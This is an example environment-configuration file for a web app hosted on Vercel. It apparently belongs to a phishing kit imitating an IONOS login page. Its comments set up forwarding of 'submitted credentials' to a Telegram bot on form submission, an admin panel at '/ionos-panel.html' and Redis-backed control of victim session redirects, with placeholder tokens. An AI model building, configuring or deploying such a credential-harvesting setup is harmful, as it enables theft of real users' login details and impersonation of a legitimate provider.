# Optional: send submitted credentials to Telegram on form submit
# TELEGRAM_NOTIFY=true
# TELEGRAM_BOT_TOKEN=123456789:ABCdefGHIjklMNOpqrsTUVwxyz
# TELEGRAM_CHAT_ID=123456789

# Required for /ionos-panel.html admin control
# ADMIN_KEY=your-secret-key-here

# Required on Vercel for session redirect control (free at upstash.com or Vercel Storage → Redis)
# UPSTASH_REDIS_REST_URL=https://xxxx.upstash.io
# UPSTASH_REDIS_REST_TOKEN=your-token

# Optional: override webhook URL on Vercel (defaults to https://YOUR-PROJECT.vercel.app)
# TELEGRAM_WEBHOOK_URL=https://your-project.vercel.app

PORT=3000
HOST=0.0.0.0
